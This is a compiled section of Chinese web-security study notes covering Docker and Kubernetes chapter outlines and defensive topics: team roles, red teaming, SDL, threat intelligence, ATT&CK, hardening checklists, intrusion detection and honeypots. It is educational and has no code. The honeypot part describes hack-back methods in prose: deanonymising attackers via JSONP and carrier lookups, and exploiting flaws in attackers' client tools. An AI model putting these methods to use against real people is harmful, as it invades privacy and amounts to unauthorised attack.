该页面为 Docker 安全章节的目录索引页：

### 7.3.1 虚拟化技术与容器技术
- 7.3.1.1 传统虚拟化技术
- 7.3.1.2 容器技术

### 7.3.2 Docker
- 7.3.2.1 基本概念
- 7.3.2.2 组成
- 7.3.2.3 数据
- 7.3.2.4 网络

### 7.3.3 安全风险与安全机制
- 7.3.3.1 Docker安全基线
- 7.3.3.2 内核命名空间/namespace
- 7.3.3.3 Control Group
- 7.3.3.4 守护进程的攻击面
- 7.3.3.5 Capability
- 7.3.3.6 Seccomp

### 7.3.4 攻击面分析

### 7.3.5 供应链安全

### 7.3.6 容器逃逸
- 7.3.6.1 虚拟化风险
- 7.3.6.2 利用内核漏洞逃逸
- 7.3.6.3 容器逃逸漏洞
- 7.3.6.4 配置不当
- 7.3.6.5 危险挂载
- 7.3.6.6 逃逸技巧

### 7.3.7 拒绝服务

### 7.3.8 攻击 Docker 守护进程

### 7.3.9 其他CVE

### 7.3.10 安全加固

### 7.3.11 Docker 环境识别
- 7.3.11.1 Docker内
- 7.3.11.2 Docker外

### 7.3.12 容器内信息收集

### 7.3.13 镜像
- 7.3.13.1 基本概念
- 7.3.13.2 Windows 镜像

### 7.3.14 参考链接
- 7.3.14.1 安全分析
- 7.3.14.2 Windows

---

## [7.4. Kubernetes](https://websec.readthedocs.io/zh/latest/cloud/k8s/index.html)

该页面为 Kubernetes 安全章节的目录索引页：

* 7.4.1. k8s概念
   * 7.4.1.1. 组成
   * 7.4.1.2. 核心设计
* 7.4.2. 安全
   * 7.4.2.1. 常见安全问题
* 7.4.3. 参考链接
   * 7.4.3.1. 靶场

---

## [7.5. 参考链接](https://websec.readthedocs.io/zh/latest/cloud/ref.html)

### 7.5.1. 文档

* [Kubernetes Documentation](https://kubernetes.io/docs/home/)
* [Openstack wiki](https://wiki.openstack.org/wiki/Main%5FPage)
* [NSA, CISA release Kubernetes Hardening Guidance](https://www.nsa.gov/News-Features/Feature-Stories/Article-View/Article/2716980/nsa-cisa-release-kubernetes-hardening-guidance/)
* [Kubernetes Hardening Guidance](https://github.com/rootsongjc/kubernetes-hardening-guidance) Kubernetes 加固手册

### 7.5.2. 元数据安全

* [Exploiting SSRF in AWS Elastic Beanstalk](https://notsosecure.com/exploiting-ssrf-in-aws-elastic-beanstalk/)

### 7.5.3. 云存储

* [ceph](https://github.com/ceph/ceph)
* [ceph tracker](https://tracker.ceph.com/)

---

# Web安全学习笔记 - 防御技术 + 认证机制

## [团队建设](https://websec.readthedocs.io/zh/latest/defense/team.html)

### 8.1.1. 人员分工

* 部门负责人
   * 负责组织整体的信息安全规划
   * 负责向高层沟通申请资源
   * 负责与组织其他部门的协调沟通
   * 共同推进信息安全工作
   * 负责信息安全团队建设
   * 负责安全事件应急工作处置
   * 负责推动组织安全规划的落实
* 合规管理员
   * 负责安全相关管理制度、管理流程的制定，监督实施情况，修改和改进相关的制度和流程
   * 负责合规性迎检准备工作，包括联络、迎检工作推动，迎检结果汇报等所有相关工作
   * 负责与外部安全相关单位联络
   * 负责安全意识培训、宣传和推广
* 安全技术负责人
   * 业务安全防护整体技术规划和计划
   * 了解组织安全技术缺陷，并能找到方法进行防御
   * 安全设备运维
   * 服务器与网络基础设备的安全加固推进工作
   * 安全事件排查与分析，配合定期编写安全分析报告
   * 关注注业内安全事件， 跟踪最新漏洞信息，进行业务产品的安全检查
   * 负责漏洞修复工作推进，跟踪解决情况，问题收集
   * 了解最新安全技术趋势
* 渗透/代码审计人员
   * 对组织业务网站、业务系统进行安全评估测试
   * 对漏洞结果提供解决方案和修复建议
* 安全设备运维人员
   * 负责设备配置和策略的修改
   * 负责协助其他部门的变更导致的安全策略修改的实现
* 安全开发
   * 根据组织安全的需要开发安全辅助工具或平台
   * 参与安全系统的需求分析、设计、编码等开发工作
   * 维护公司现有的安全程序与系统

### 8.1.2. 参考链接

* [初入甲方的企业安全建设规划](https://mp.weixin.qq.com/s/BqOFP217kiN55IWb%5FoQP-w)
* [企业安全项目架构实践分享](https://mp.weixin.qq.com/s/RlBTH9-xrY7Nd1ZJK3KjDQ)
* [企业信息安全团队建设](https://xz.aliyun.com/t/1965)

---

## [红蓝对抗](https://websec.readthedocs.io/zh/latest/defense/redteam.html)

### 8.2.1. 概念

红蓝对抗的概念最早来源于20世纪60年代的美国演习，演习是专指军队进行大规模的实兵演习，演习中通常分为红军、蓝军，其中蓝军通常是指在部队模拟对抗演习专门扮演假想敌的部队，与红军(代表我方正面部队)进行针对性的训练，这种方式也被称作Red Teaming。

网络安全红蓝对抗的概念就源自于此。红军作为企业防守方，通过安全加固、攻击监测、应急处置等手段来保障企业安全。而蓝军作为攻击方，以发现安全漏洞，获取业务权限或数据为目标，利用各种攻击手段，试图绕过红军层层防护，达成既定目标。可能会造成混淆的是，在欧美一般采用红队代表攻击方，蓝队代表防守方，颜色代表正好相反。

### 8.2.2. 网络攻防演习

比较有影响力的演习有"锁盾"(Locked Shields)、"网络风暴"等。其中"锁盾"由北约卓越网络防御合作中心(CCDCOE，Cooperative Cyber Defence Centre of Excellence)每年举办一次。"网络风暴"由美国国土安全部(DHS)主导，2006年开始，每两年举行一次。

和APT攻击相比，攻防演习相对时长较短，只有1~4周，有个防守目标。而APT攻击目标唯一，时长可达数月至数年，更有隐蔽性。

### 8.2.3. 侧重

企业网络蓝军工作内容主要包括渗透测试和红蓝对抗，这两种方式所使用的技术基本相同，但是侧重点不同。

渗透测试侧重用较短的时间去挖掘更多的安全漏洞，一般不太关注攻击行为是否被监测发现，目的是帮助业务系统暴露和收敛更多风险。

红蓝对抗更接近真实场景，偏向于实战，面对的场景复杂、技术繁多。侧重绕过防御体系，毫无声息达成获取业务权限或数据的目标。不求发现全部风险点，因为攻击动作越多被发现的概率越大，一旦被发现，红军就会把蓝军踢出战场。红蓝对抗的目的是检验在真实攻击中纵深防御能力、告警运营质量、应急处置能力。

### 8.2.4. 目标

* 评估现有防御能力的有效性、识别防御体系的弱点并提出具体的应对方案
* 利用真实有效的模拟攻击来评估因为安全问题所造成的潜在的业务影响，为安全管理提供有效的数据来量化安全投入的ROI
* 提高公司安全成熟度及其检测和响应攻击的能力

### 8.2.5. 前期准备

* 组织结构图
* 全网拓扑图
* 各系统逻辑结构图
* 各系统之间的调用关系
* 数据流关系
* 资产梳理
   * 核心资产清单
   * 业务系统资产
   * 设备资产
   * 外包/第三方服务资产
   * 历史遗留资产
* 业务资产信息
   * 业务系统名称
   * 业务系统类型
   * 服务器类型
   * 域名/IP地址
   * 服务端口
   * 版本
   * 系统部署位置
   * 开发框架
   * 中间件
   * 数据库
   * 责任人
   * 维护人员
* 设备资产信息
   * 设备名称
   * 设备版本号
   * 固件版本号
   * IP地址
   * 部署位置
   * 责任人
   * 维护人员
* 外包/第三方服务资产信息
   * 厂商联系方式
   * 系统名称
   * 系统类型
   * IP/URL地址
   * 部署位置
   * 责任人
   * 维护人员
   * 厂商联系方式
   * 第三方值班人员
* 风险梳理
   * 基础设施风险
   * 帐号权限梳理
   * 互联网风险排查
   * 收敛攻击面
* 应急响应计划
* 业务连续性计划
* 灾难恢复计划

### 8.2.6. 行动流程

* 攻击准备
   * 明确授权范围、测试目标、限制条件等
   * 报备与授权流程
   * 行动成本与预算
* 攻击执行
   * 备案的时间区间内
   * 备案的目标范围内
   * 备案的攻击IP与网络环境
* 攻击完成
   * 恢复所有修改
   * 移除所有持久化控制
   * 提交攻击报告与改进建议

### 8.2.7. 注意事项

* 测试前进行报备
* 有可能会影响到业务的操作时候提前沟通
* 漏洞和业务沟通确认后再发工单修复
* 漏洞闭环

### 8.2.8. 参考链接

* [以攻促防 企业蓝军建设思考](https://mp.weixin.qq.com/s/8iJs2ON66NY1Jdbt7c-BTA)
* [云上攻防：Red Teaming for Cloud](http://avfisher.win/archives/1175)
* [网络攻防演练之企业蓝队建设指南](https://www.freebuf.com/articles/neopoints/252229.html)

---

## [安全开发](https://websec.readthedocs.io/zh/latest/defense/sdl.html)

### 8.3.1. 简介

安全开发生命周期（Security Development Lifecycle，SDL）是微软提出的从安全的角度来指导软件开发过程的管理模式。用于帮助开发人员构建更安全的软件、解决安全合规要求，并降低开发成本。

### 8.3.2. 步骤

#### 8.3.2.1. 阶段1：培训

开发团队的所有成员都必须接受适当的安全培训，了解相关的安全知识。培训对象包括开发人员、测试人员、项目经理、产品经理等。

#### 8.3.2.2. 阶段2：确定安全需求

在项目确立之前，需要提前确定安全方面的需求，确定项目的计划时间，尽可能避免安全引起的需求变更。

#### 8.3.2.3. 阶段3：设计

在设计阶段确定安全的最低可接受级别。考虑项目涉及到哪些攻击面、是否能减小攻击面。

对项目进行威胁建模，明确可能来自的攻击有哪些方面，并考虑项目哪些部分需要进行渗透测试。

#### 8.3.2.4. 阶段4：实现

实现阶段主要涉及到工具、不安全的函数、静态分析等方面。

工具方面主要考虑到开发团队使用的编辑器、链接器等相关工具可能会涉及一些安全相关的问题，因此在使用工具的版本上，需要提前与安全团队进行沟通。

函数方面主要考虑到许多常用函数可能存在安全隐患，应当禁用不安全的函数和API，使用安全团队推荐的函数。

代码静态分析可以由相关工具辅助完成，其结果与人工分析相结合。

#### 8.3.2.5. 阶段5：验证

验证阶段涉及到动态程序分析和攻击面再审计。动态分析对静态分析进行补充，常用的方式是模糊测试、渗透测试。模糊测试通过向应用程序引入特定格式或随机数据查找程序可能的问题。

考虑到项目经常会因为需求变更等情况使得最终产品和初期目标不一致，因此需要在项目后期再次对威胁模型和攻击面进行分析和考虑，如果出现问题则进行纠正。

#### 8.3.2.6. 阶段6：发布

在程序发布后，需要对安全事件进行响应，需要预设好遇到安全问题时的处理方式。

另外如果产品中包含第三方的代码，也需要考虑如何响应因为第三方依赖引入的问题。

### 8.3.3. 参考链接

- [SDL Practices](https://www.microsoft.com/en-us/securityengineering/sdl/practices)
- [Threat Modeling](https://www.microsoft.com/en-us/securityengineering/sdl/threatmodeling)

---

## [安全建设](https://websec.readthedocs.io/zh/latest/defense/secops.html)

### 8.4.1. 参考链接

### 8.4.2. 安全运营

- [我理解的安全运营 by 职业欠钱](https://zhuanlan.zhihu.com/p/39467201)
- [再谈安全运营 by 职业欠钱](https://zhuanlan.zhihu.com/p/84591095)
- [我们谈安全运营时在谈什么 by 聂君](https://mp.weixin.qq.com/s?__biz=MzIzMTAzNzUxMQ==&mid=2652893616&idx=1&sn=6738a4e33050ed084d1535196aec6061)
- [金融行业企业安全运营之路 by 聂君](https://36kr.com/p/1721236635649)
- [秦波：大型互联网应用安全SDL体系建设实践](https://mp.weixin.qq.com/s?__biz=MzI2MjQ1NTA4MA==&mid=2247485062&idx=1&sn=94c9fa40edef6de0ea46c453405e3687)
- [谭晓生：论CISO的个人修养](https://mp.weixin.qq.com/s?__biz=MzI2MjQ1NTA4MA==&mid=2247485405&idx=1&sn=bda9283329f6db15d69d4cdf37c609d2)
- [赵彦的CISO闪电战 两年甲方安全修炼之路](https://www.freebuf.com/articles/es/200024.html)
- [胡珀谈安全运营 by lake2](https://mp.weixin.qq.com/s?__biz=MzI2MjQ1NTA4MA==&mid=2247484735&idx=1&sn=02e06dd84ee0322dd2f9fe761b244013)
- [小步快跑，快速迭代：安全运营的器术法道](https://mp.weixin.qq.com/s/rc6X5SlsoRp6s7RCEZ67mA)

#### 8.4.2.1. 资产管理

- [资产管理的难点](https://mp.weixin.qq.com/s?__biz=MzA5MDY3MzMyOQ==&mid=2649439751&idx=1&sn=18ac49aff75ee4b1433e429df56ba44b)

---

## [威胁情报](https://websec.readthedocs.io/zh/latest/defense/threat.html)

### 8.5.1. 简介

#### 8.5.1.1. 产生原因

新一代的攻击者常常向企业和组织发起针对性的网络攻击，这种针对性强的攻击，一般经过了精心的策划，攻击方法、途径复杂，后果严重。在面对这种攻击时，攻防存在着严重的不对等，为了尽可能消除这种不对等，威胁情报 应运而生。

#### 8.5.1.2. 定义

威胁情报，也被称作安全情报、安全威胁情报。

关于威胁情报的定义有很多，一般是指从安全数据中提炼的，与网络空间威胁相关的信息，包括威胁来源、攻击意图、攻击手法、攻击目标信息，以及可用于解决威胁或应对危害的知识。广义的威胁情报也包括情报的加工生产、分析应用及协同共享机制。相关的概念有资产、威胁、脆弱性等，具体定义如下。

一般威胁情报需要包含威胁源、攻击目的、攻击对象、攻击手法、漏洞、攻击特征、防御措施等。威胁情报在事前可以起到预警的作用，在威胁发生时可以协助进行检测和响应，在事后可以用于分析和溯源。

常见的网络威胁情报服务有黑客或欺诈团体分析、社会媒体和开源信息监控、定向漏洞研究、定制的人工分析、实时事件通知、凭据恢复、事故调查、伪造域名检测等。

在威胁情报方面，比较有代表性的厂商有BAE Systems Applied Intelligence、Booz Allen、RSA、IBM、McAfee、赛门铁克、FireEye等。

### 8.5.2. 相关概念

#### 8.5.2.1. 资产

对组织具有价值的信息或资源，属于内部情报，通过资产测绘等方式发现。

#### 8.5.2.2. 威胁

能够通过未授权访问、毁坏、揭露、数据修改和或拒绝服务对系统造成潜在危害的起因，威胁可由威胁的主体(威胁源)、能力、资源、动机、途径、可能性和后果等多种属性来刻画

#### 8.5.2.3. 脆弱性 / 漏洞

可能被威胁如攻击者利用的资产或若干资产薄弱环节。

漏洞存在多个周期，最开始由安全研究员或者攻击者发现，而后出现在社区公告/官方邮件/博客中。随着信息的不断地传递，漏洞情报出现在开源社区等地方，并带有PoC和漏洞细节分析。再之后出现自动化工具开始大规模传播，部分漏洞会造成社会影响并被媒体报道，最后漏洞基本修复。

#### 8.5.2.4. 风险

威胁利用资产或一组资产的脆弱性对组织机构造成伤害的潜在可能。

#### 8.5.2.5. 安全事件

威胁利用资产的脆弱性后实际产生危害的情景。

### 8.5.3. 情报来源

为了实现情报的同步和交换，各组织都制定了相应的标准和规范。主要有国标，美国联邦政府标准等。

除了国家外，企业也有各自的情报来源，例如厂商、CERT、开发者社区、安全媒体、漏洞作者或团队、公众号、个人博客、代码仓库等。

### 8.5.4. 威胁框架

比较有影响力的威胁框架主要有洛克希德-马丁的杀伤链框架、MITRE的ATT&CK框架、ODNI的CCTF框架(Common Cyber Threat Framework，公共网空威胁框架)，以及NSA的TCTF框架(Technical Cyber Threat Framework，技术性网空威胁框架)。

### 8.5.5. 参考链接

* [Executive Perspectives on Cyber Threat Intelligence](https://scadahacker.com/library/Documents/Threat%5FIntelligence/iSight%20Partners%20-%20Executive%20Perspectives%20on%20Cyber%20Threat%20Intelligence.pdf)
* [Cyber Threats: Information vs. Intelligence](https://www.darkreading.com/analytics/threat-intelligence/cyber-threats-information-vs-intelligence/a/d-id/1316851)
* [威胁情报简介及市场浅析](https://www.freebuf.com/column/136763.html)

---

## [ATT&CK](https://websec.readthedocs.io/zh/latest/defense/att8ck.html)

### 8.6.1. 简介

MITRE是美国政府资助的一家研究机构，该公司于1958年从MIT分离出来，并参与了许多商业和最高机密项目。其中包括开发FAA空中交通管制系统和AWACS机载雷达系统。MITRE在美国国家标准技术研究所(NIST)的资助下从事了大量的网络安全实践。

MITRE在2013年推出了ATT&CK™ 模型，它的全称是 Adversarial Tactics, Techniques, and Common Knowledge (ATT&CK)，它是一个站在攻击者的视角来描述攻击中各阶段用到的技术的模型。将已知攻击者行为转换为结构化列表，将这些已知的行为汇总成战术和技术，并通过几个矩阵以及结构化威胁信息表达式(STIX)、指标信息的可信自动化交换(TAXII)来表示。由于此列表相当全面地呈现了攻击者在攻击网络时所采用的行为，因此对于各种进攻性和防御性度量、表示和其他机制都非常有用。多用于模拟攻击、评估和提高防御能力、威胁情报提取和建模、威胁评估和分析。

官方对 ATT&CK的描述是：

MITRE's Adversarial Tactics, Techniques, and Common Knowledge (ATT&CK) is a curated knowledge base and model for cyber adversary behavior, reflecting the various phases of an adversary's attack lifecycle and the platforms they are known to target.

和Kill Chain等模型相比，ATT&CK的抽象程度会低一些，但是又比普通的利用和漏洞数据库更高。MITRE公司认为，Kill Chain在高维度理解攻击过程有帮助，但是无法有效描述对手在单个漏洞的行为。

目前ATT&CK模型分为三部分，分别是PRE-ATT&CK，ATT&CK for Enterprise(包括Linux、macOS、Windows)和ATT&CK for Mobile(包括iOS、Android)，其中PRE-ATT&CK覆盖攻击链模型的前两个阶段(侦察跟踪、武器构建)，ATT&CK for Enterprise覆盖攻击链的后五个阶段(载荷传递、漏洞利用、安装植入、命令与控制、目标达成)，ATT&CK Matrix for Mobile主要针对移动平台。

PRE-ATT&CK包括的战术有优先级定义、选择目标、信息收集、发现脆弱点、攻击性利用开发平台、建立和维护基础设施、人员的开发、建立能力、测试能力、分段能力。

ATT&CK for Enterprise包括的战术有访问初始化、执行、常驻、提权、防御规避、访问凭证、发现、横向移动、收集、数据获取、命令和控制。

### 8.6.2. TTP

MITRE在定义ATT&CK时，定义了一些关键对象：组织 (Groups)、软件 (Software)、技术 (Techniques)、战术 (Tactics)。

其中组织使用战术和软件，软件实现技术，技术实现战术。例如APT28(组织)使用Mimikatz(软件)达到了获得登录凭证的效果(技术)实现了以用户权限登录的目的(战术)。整个攻击行为又被称为TTP，是战术、技术、过程的集合。

### 8.6.3. 参考链接

* [Mitre ATT&CK](https://attack.mitre.org/)
* [Adversarial Threat Matrix](https://github.com/mitre/advmlthreatmatrix)
* [MITRE ATT&CK：Design and Philosophy](https://www.mitre.org/sites/default/files/publications/pr-18-0944-11-mitre-attack-design-and-philosophy.pdf)
* [ATT&CK一般性学习笔记](https://bbs.pediy.com/thread-254825.htm)
* [Cyber Threat Intelligence Repository expressed in STIX 2.0](https://github.com/mitre/cti)
* [sigma](https://github.com/Neo23x0/sigma) Generic Signature Format for SIEM Systems
* [caldera](https://github.com/mitre/caldera) Automated Adversary Emulation
* [RTA](https://github.com/endgameinc/RTA) Red Team Automation

---

## [风险控制](https://websec.readthedocs.io/zh/latest/defense/riskcontrol.html)

### 8.7.1. 常见风险

#### 会员

- 撞库盗号
- 账号分享
- 批量注册

#### 视频

- 盗播盗看
- 广告屏蔽
- 刷量作弊

#### 活动

- 恶意刷
- 薅羊毛

#### 直播

- 挂站人气
- 恶意图文

#### 电商

- 恶意下单
- 订单欺诈

#### 支付

- 盗号盗卡
- 洗钱
- 恶意下单
- 恶意提现

#### 其他

- 钓鱼邮件
- 恶意爆破
- 短信轰炸

### 8.7.2. 防御策略

#### 核身策略

- 同一收货手机号
- 同一收货地址
- 同一历史行为
- 同一IP
- 同一设备
- 同一支付ID
- LBS

### 8.7.3. 异常特征

#### APP用户异常特征

- IP
- 设备为特定型号
- 本地APP列表中有沙盒APP
- Root用户
- 同设备登录过多个账号

### 8.7.4. 参考链接

- [支付风控模型和流程分析](http://doc.cocolian.cn/essay/risk/2016/12/18/risk-2-database/)
- [爱奇艺业务安全风控体系的建设实践](https://mp.weixin.qq.com/s?__biz=MzI0MjczMjM2NA==&mid=2247483836&idx=1&sn=d46875c957289d8e035345992ad7053e)

---

## [防御框架](https://websec.readthedocs.io/zh/latest/defense/framework.html)

### 8.8.1. 防御纵深

根据纵深，防御可以分为物理层、数据层、终端层、系统层、网络层、应用层几层。这几层纵深存在层层递进相互依赖的关系。

#### 8.8.1.1. 物理层

物理层实际应用中接触较少，但仍是非常重要的位置。如果物理层设计不当，很容易被攻击者通过物理手段绕过上层防御。

#### 8.8.1.2. 数据层

数据处于防御纵深较底层的位置，攻击的目标往往也是为了拿到数据，很多防御也是围绕数据不被破坏、窃取等展开的。

#### 8.8.1.3. 终端层

终端包括PC、手机、IoT以及其他的智能设备，连入网络的终端是否可信是需要解决的问题。

#### 8.8.1.4. 系统层

操作系统运行在终端上，可能会存在提权、非授权访问等问题。

#### 8.8.1.5. 网络层

网络层使用通信线路将多台计算机相互连接起来，依照商定的协议进行通信。网络层存在MITM、DDoS等攻击。

#### 8.8.1.6. 应用层

应用层是最上层，主要涉及到Web应用程序的各种攻击。

### 8.8.2. 访问控制

Web应用需要限制用户对应用程序的数据和功能的访问，以防止用户未经授权访问。访问控制的过程可以分为验证、会话管理和访问控制三个地方。

#### 8.8.2.1. 验证机制

验证机制在一个应用程序的用户访问处理中是一个最基本的部分，验证就是确定该用户的有效性。大多数的web应用都采用使用的验证模型，即用户提交一个用户名和密码，应用检查它的有效性。在银行等安全性很重要的应用程序中，基本的验证模型通常需要增加额外的证书和多级登录过程，比如客户端证书、硬件等。

#### 8.8.2.2. 会话管理

为了实施有效的访问控制，应用程序需要一个方法来识别和处理这一系列来自每个不同用户的请求。大部分程序会为每个会话创建一个唯一性的token来识别。

对攻击者来说，会话管理机制高度地依赖于token的安全性。在部分情况下，一个攻击者可以伪装成受害的授权用户来使用Web应用程序。这种情况可能有几种原因，其一是token生成的算法的缺陷，使得攻击者能够猜测到其他用户的token；其二是token后续处理的方法的缺陷，使得攻击者能够获得其他用户的token。

#### 8.8.2.3. 访问控制

处理用户访问的最后一步是正确决定对于每个独立的请求是允许还是拒绝。如果前面的机制都工作正常，那么应用程序就知道每个被接受到的请求所来自的用户的id，并据此决定用户对所请求要执行的动作或要访问的数据是否得到了授权。

由于访问控制本身的复杂性，这使得它成为攻击者的常用目标。开发者经常对用户会如何与应用程序交互作出有缺陷的假设，也经常省略了对某些应用程序功能的访问控制检查。

### 8.8.3. 输入处理

很多对Web应用的攻击都涉及到提交未预期的输入，它导致了该应用程序设计者没有料到的行为。因此，对于应用程序安全性防护的一个关键的要求是它必须以一个安全的方式处理用户的输入。

基于输入的漏洞可能出现在一个应用程序的功能的任何地方，并与其使用的技术类型相关。对于这种攻击，输入验证是常用的必要防护。常用的防护机制有如下几种：黑名单、白名单、过滤、处理。

#### 8.8.3.1. 黑名单

黑名单包含已知的被用在攻击方面的一套字面上的字符串或模式，验证机制阻挡任何匹配黑名单的数据。

一般来说，这种方式是被认为是输入效果较差的一种方式。主要有两个原因，其一Web应用中的一个典型的漏洞可以使用很多种不同的输入来被利用，输入可以是被加密的或以各种不同的方法表示。

其二，漏洞利用的技术是在不断地改进的，有关利用已存在的漏洞类型的新的方法不可能被当前黑名单阻挡。

#### 8.8.3.2. 白名单

白名单包含一系列的字符串、模式或一套标准来匹配符合要求的输入。这种检查机制允许匹配白名单的数据，阻止之外的任何数据。这种方式相对比较有效，但需要比较好的设计。

#### 8.8.3.3. 过滤

过滤会删除潜在的恶意字符并留下安全的字符，基于数据过滤的方式通常是有效的，并且在许多情形中，可作为处理恶意输入的通用解决方案。

#### 8.8.3.4. 安全地处理数据

非常多的web应用程序漏洞的出现是因为用户提供的数据是以不安全的方法被处理的。在一些情况下，存在安全的编程方法能够避免通常的问题。例如，SQL注入攻击能够通过预编译的方式组织，XSS在大部分情况下能够被转义所防御。

---

## [加固检查](https://websec.readthedocs.io/zh/latest/defense/reinforce.html)

### 8.9.1. 网络设备

- 及时检查系统版本号
- 敏感服务设置访问IP/MAC白名单
- 开启权限分级控制
- 关闭不必要的服务
- 打开操作日志
- 配置异常告警
- 关闭ICMP回应

### 8.9.2. 操作系统

#### 8.9.2.1. Linux

- 无用用户/用户组检查
- 空口令帐号检查
- 用户密码策略
  - /etc/login.defs
  - /etc/pam.d/system-auth
- 敏感文件权限配置
  - /etc/passwd
  - /etc/shadow
  - ~/.ssh/
  - /var/log/messages
  - /var/log/secure
  - /var/log/maillog
  - /var/log/cron
  - /var/log/spooler
  - /var/log/boot.log
- 日志是否打开
- 及时安装补丁
- 开机自启
  - /etc/init.d
- 检查系统时钟

#### 8.9.2.2. Windows

- 异常进程监控
- 异常启动项监控
- 异常服务监控
- 配置系统日志
- 用户账户
  - 设置口令有效期
  - 设置口令强度限制
  - 设置口令重试次数
- 安装EMET
- 启用PowerShell日志
- 限制以下敏感文件的下载和执行
  - ade, adp, ani, bas, bat, chm, cmd, com, cpl, crt, hlp, ht, hta, inf, ins, isp, job, js, jse, lnk, mda, mdb, mde, mdz, msc, msi, msp, mst, pcd, pif, reg, scr, sct, shs, url, vb, vbe, vbs, wsc, wsf, wsh, exe, pif
- 限制会调起wscript的后缀
  - bat, js, jse, vbe, vbs, wsf, wsh
- 域
  - 限制将计算机加入域的权限
  - 域账户使用最小权限原则
  - 减少非必要高权限账户的数量

### 8.9.3. 应用

#### 8.9.3.1. FTP

- 禁止匿名登录
- 修改Banner

#### 8.9.3.2. SSH

- 是否禁用ROOT登录
- 是否禁用密码连接

#### 8.9.3.3. MySQL

- 文件写权限设置
- 用户授权表管理
- 日志是否启用
- 版本是否最新

### 8.9.4. Web中间件

#### 8.9.4.1. Apache

- 版本号隐藏
- 版本是否最新
- 禁用部分HTTP动词
- 关闭Trace
- 禁止 server-status
- 上传文件大小限制
- 目录权限设置
- 是否允许路由重写
- 是否允许列目录
- 日志配置
- 配置超时时间防DoS
- 非属主用户文件读写限制
  - httpd.conf
  - access.log
  - error.log

#### 8.9.4.2. Nginx

- 禁用部分HTTP动词
- 禁用目录遍历
- 检查重定向配置
- 配置超时时间防DoS

#### 8.9.4.3. IIS

- 版本是否最新
- 日志配置
- 用户口令配置
- ASP.NET功能配置
- 配置超时时间防DoS

#### 8.9.4.4. JBoss

- jmx console配置
- web console配置

#### 8.9.4.5. Tomcat

- 禁用部分HTTP动词
- 禁止列目录
- 禁止manager功能
- 用户密码配置
- 用户权限配置
- 配置超时时间防DoS

### 8.9.5. 密码管理策略

- 长度不少于8个字符
- 不存在于已有字典之中
- 不使用基于知识的认证方式

### 8.9.6. 参考链接

- [awesome windows domain hardening](https://github.com/PaulSec/awesome-windows-domain-hardening)
- [customize attack surface reduction](https://docs.microsoft.com/zh-cn/windows/security/threat-protection/microsoft-defender-atp/customize-attack-surface-reduction)

---

## [入侵检测](https://websec.readthedocs.io/zh/latest/defense/intrusiondetection.html)

### 8.10.1. IDS与IPS

IDS与IPS是常见的防护设备，IPS相对IDS的不同点在于，IPS通常具有阻断能力。

### 8.10.2. 常见入侵点

- Web入侵
- 高危服务入侵

### 8.10.3. 监控实现

#### 8.10.3.1. 客户端监控

- 监控敏感配置文件
- 常用命令ELF文件完整性监控
  - `ps`
  - `lsof`
  - ...
- rootkit监控
- 资源使用报警
  - 内存使用率
  - CPU使用率
  - IO使用率
  - 网络使用率
- 新出现进程监控
- 基于inotify的文件监控

#### 8.10.3.2. 网络检测

基于网络层面的攻击向量做检测，如Snort等。

#### 8.10.3.3. 日志分析

将主机系统安全日志/操作日志、网络设备流量日志、Web应用访问日志、SQL应用访问日志等日志集中到一个统一的后台，在后台中对各类日志进行综合的分析。

### 8.10.4. 参考链接

- 企业安全建设之HIDS
- 大型互联网企业入侵检测实战总结
- 同程入侵检测系统
- Web日志安全分析系统实践
- Web日志安全分析浅谈
- 网络层绕过IDS/IPS的一些探索

---

## [零信任安全](https://websec.readthedocs.io/zh/latest/defense/zt.html)

### 8.11.1. 参考链接

- [美国国防部零信任的支柱](https://mp.weixin.qq.com/s/Fd0iKkGgE6Y1e81tP3MJFQ)

---

## [蜜罐技术](https://websec.readthedocs.io/zh/latest/defense/honeypot.html)

### 8.12.1. 简介

蜜罐是对攻击者的欺骗技术，用以监视、检测、分析和溯源攻击行为，其没有业务上的用途，所有流入/流出蜜罐的流量都预示着扫描或者攻击行为，因此可以比较好的聚焦于攻击流量。

蜜罐可以实现对攻击者的主动诱捕，能够详细地记录攻击者攻击过程中的许多痕迹，可以收集到大量有价值的数据，如病毒或蠕虫的源码、黑客的操作等，从而便于提供丰富的溯源数据。另外蜜罐也可以消耗攻击者的时间，基于JSONP等方式来获取攻击者的画像。

但是蜜罐存在安全隐患，如果没有做好隔离，可能成为新的攻击源。

### 8.12.2. 分类

按用途分类，蜜罐可以分为研究型蜜罐和产品型蜜罐。研究型蜜罐一般是用于研究各类网络威胁，寻找应对的方式，不增加特定组织的安全性。产品型蜜罐主要是用于防护的商业产品。

按交互方式分类，蜜罐可以分为低交互蜜罐和高交互蜜罐。低交互蜜罐模拟网络服务响应和攻击者交互，容易部署和控制攻击，但是模拟能力会相对较弱，对攻击的捕获能力不强。高交互蜜罐不是简单模拟协议或服务，而是提供真实的系统，使得被发现的概率大幅度降低。但是高交互蜜罐部署不当时存在被攻击者利用的可能性。

### 8.12.3. 隐藏技术

蜜罐主要涉及到的是伪装技术，主要涉及到进程隐藏、服务伪装等技术。

蜜罐之间的隐藏，要求蜜罐之间相互隐蔽。进程隐藏，蜜罐需要隐藏监控、信息收集等进程。伪服务和命令技术，需要对部分服务进行伪装，防止攻击者获取敏感信息或者入侵控制内核。数据文件伪装，需要生成合理的虚假数据的文件。

### 8.12.4. 牵引技术

蜜罐牵引技术是在识别到攻击者流量后，通过在正式环境中改变路由、返回特定响应的方式将攻击者牵引到特定的蜜罐地址。常见的牵引技术有下面几种：

* 防火墙牵引
* SDN牵引
* ARP牵引
* WAF牵引

### 8.12.5. 诱饵技术

可以在互联网中部署一定的诱饵来吸引攻击者进入特定的蜜罐中。常见的诱饵有域名诱饵、Github 诱饵、网盘诱饵、邮件诱饵、主机诱饵、文件诱饵、漏洞诱饵等。

域名诱饵指使用特定的在字典中且有意义的主域名做为诱饵，比如 `vpn.example.com` / `oa.example.com` 等。

Github 诱饵指在 Github 中放置代码文件、失陷凭证的方式。

文件诱饵是在容易失陷的主机中放置虚假的拓扑图，关键系统IP的文件，从而诱导攻击者的方式。

漏洞诱饵通过部署存在特定漏洞特征的蜜罐站，吸引攻击者攻击。

### 8.12.6. 反制技术

蜜罐可以使用一些方式对攻击者进行反制，常见的方式有Jsonp、安全工具漏洞、Client漏洞反制、文件反制等方式。

Jsonp主要是使用各大网站的Jsonp获取攻击者已经登录的社交账号，用以溯源。另外如果攻击者使用流量的方式访问蜜罐网站，可以使用运营商接口获取攻击者的手机号。

安全工具漏洞是指使用安全工具的漏洞进行反制，例如Git泄露工具存在的文件泄露漏洞，基于Electron的工具存在的XSS to RCE等。

Client反制，指使用虚假的Server对存在漏洞的客户端进行反制，例如通过MySQL Client读取文件，基于RDP/SMB的漏洞进行RCE。

